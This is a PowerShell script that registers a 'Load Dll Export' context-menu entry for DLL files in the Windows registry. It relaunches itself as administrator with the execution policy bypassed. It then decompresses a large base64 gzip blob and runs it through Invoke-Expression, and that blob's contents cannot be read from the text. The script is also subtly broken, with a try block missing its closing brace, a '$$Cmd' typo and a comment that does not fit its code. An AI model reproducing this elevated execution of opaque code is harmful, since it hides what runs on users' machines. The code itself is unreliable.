
<#
#̷\   ⼕龱ᗪ㠪⼕闩丂ㄒ龱尺 ᗪ㠪ᐯ㠪㇄龱尸爪㠪𝓝ㄒ
#̷\   🇵​​​​​🇴​​​​​🇼​​​​​🇪​​​​​🇷​​​​​🇸​​​​​🇭​​​​​🇪​​​​​🇱​​​​​🇱​​​​​ 🇸​​​​​🇨​​​​​🇷​​​​​🇮​​​​​🇵​​​​​🇹​​​​​ 🇧​​​​​🇾​​​​​ 🇨​​​​​🇴​​​​​🇩​​​​​🇪​​​​​🇨​​​​​🇦​​​​​🇸​​​​​🇹​​​​​🇴​​​​​🇷​​​​​@🇮​​​​​🇨​​​​​🇱​​​​​🇴​​​​​🇺​​​​​🇩​​​​​.🇨​​​​​🇴​​​​​🇲​​​​​
#>


[CmdletBinding(SupportsShouldProcess)]
param (
      [Parameter(Mandatory = $false)]
      [switch]$Uninstall
    )

function Uninstall-ContextualMenu
{
    [CmdletBinding(SupportsShouldProcess)]
    param ()

    try{
        New-PSDrive -PSProvider registry -Root HKEY_CLASSES_ROOT -Name HKCR
              
        Write-Host "Cleaning up..."
        $RegistryPath = 'HKCR:\dllfile\shell\dllexp'
        $null=Remove-Item -Path $RegistryPath -Recurse -Force -EA Ignore | Out-Null

        Remove-PSDrive -Name HKCR
    catch {
        Write-Error $_
    }        
}



function Install-ContextualMenu{

    try{

        # Create a temporary PowerShell drive called PSDrive:
        # that's mapped to the \\Server01\Public network share.
        New-PSDrive -PSProvider registry -Root HKEY_CLASSES_ROOT -Name HKCR
                
        Write-ChannelMessage  "====================================="
        Write-ChannelMessage  "ContextualMenu Config"
        Write-ChannelMessage  "====================================="
        
        $RegistryPathDllexp = "HKCR:\dllfile\shell\dllexp"
        $RegistryPathCmd = "$RegistryPathDllexp\command"
        $RootPath = (Resolve-Path "$PSScriptRoot\..").Path
        $BinPath = Join-Path $RootPath 'bin'
        $ImgPath = Join-Path $RootPath 'img'
        $IconPath = Join-Path $ImgPath $Icon
        $Program = Join-Path $BinPath 'dllexp.exe'

        Write-ChannelMessage  "RootPath $RootPath"
        Write-ChannelMessage  "BinPath $BinPath"
        Write-ChannelMessage  "ImgPath $ImgPath"
        Write-ChannelMessage  "IconPath $IconPath"
        Write-ChannelMessage  "Program $Program"
        if(-not(Test-Path $Program)){
            if(($ENV:ToolsRoot -eq $null) -Or ($ENV:ToolsRoot -eq '')){
                Write-Warning "ENVIRONMENT VARIABLE ToolsRoot not set to a path containing dllexp.exe..."
                throw "NOT VALID PROGRAM PATH.... $BinPath"
            }
            $Program = Join-Path $ENV:ToolsRoot 'dllexp.exe'
            Write-ChannelMessage  "Program dllexp PATH $Program "
        }
        $Cmd = '"' + $Program + '"'
        $Cmd += ' "%1"'
        New-Item $RegistryPathCmd -Force -Value "$Cmd"
        Write-ChannelMessage  "Cmd $$Cmd"

        if(-not(Test-Path $IconPath)){
            if(($ENV:SystemIcons -eq $null) -Or ($ENV:SystemIcons -eq '')){
                Write-Warning "ENVIRONMENT VARIABLE SystemIcons not set to a path containing icons..."
                throw "NOT VALID ICONS PATH.... $IconPath"
            }
            $IconPath = Join-Path "$ENV:SystemIcons" $Icon
            Write-ChannelMessage  "IconPath $IconPath UDPATE"
        }
        
        New-ItemProperty $RegistryPathDllexp -Name 'Icon' -Value  "$IconPath" | Out-Null
        New-ItemProperty $RegistryPathDllexp -Name 'MUIVerb' -Value 'Load Dll Export' | Out-Null
        Remove-PSDrive -Name HKCR
    } catch {
        Write-Error $_
    }
}



#This will self elevate the script so with a UAC prompt since this script needs to be run as an Administrator in order to function properly.
If (!([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]'Administrator')) {
    Write-Host "You didn't run this script as an Administrator. This script will self elevate to run as an Administrator and continue."
    Start-Sleep 1
    Write-Host " Launching in Admin mode" -f DarkRed
    Start-Process pwsh.exe -ArgumentList ("-NoProfile -ExecutionPolicy Bypass -File `"{0}`"" -f $PSCommandPath) -Verb RunAs
    Exit
}



# ------------------------------------
# Script file - Miscellaneous - 
# ------------------------------------
$ScriptBlockMiscellaneous = "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"


# ------------------------------------
# Loader
# ------------------------------------
function ConvertFrom-Base64CompressedScriptBlock {

    [CmdletBinding()] param(
        [String]
        $ScriptBlock
    )

    # Take my B64 string and do a Base64 to Byte array conversion of compressed data
    $ScriptBlockCompressed = [System.Convert]::FromBase64String($ScriptBlock)

    # Then decompress script's data
    $InputStream = New-Object System.IO.MemoryStream(, $ScriptBlockCompressed)
    $GzipStream = New-Object System.IO.Compression.GzipStream $InputStream, ([System.IO.Compression.CompressionMode]::Decompress)
    $StreamReader = New-Object System.IO.StreamReader($GzipStream)
    $ScriptBlockDecompressed = $StreamReader.ReadToEnd()
    # And close the streams
    $GzipStream.Close()
    $InputStream.Close()

    $ScriptBlockDecompressed
}

# For each scripts in the module, decompress and load it.

$ScriptList = @( 'Miscellaneous')
$ScriptList | ForEach-Object {
    $ScriptBlock = "`$ScriptBlock$($_)" | Invoke-Expression
    ConvertFrom-Base64CompressedScriptBlock -ScriptBlock $ScriptBlock | Invoke-Expression
}


Uninstall-ContextualMenu

if($Uninstall){
    Write-Host "Uninstall Completed, exiting." -f DarkYellow
    return
}
Write-Host "Starting configuration" -f DarkYellow
Install-ContextualMenu 'C:\Programs\SystemTools\dllexp.exe' 'dll2.ico'
Write-Host "Install Completed, exiting." -f DarkYellow


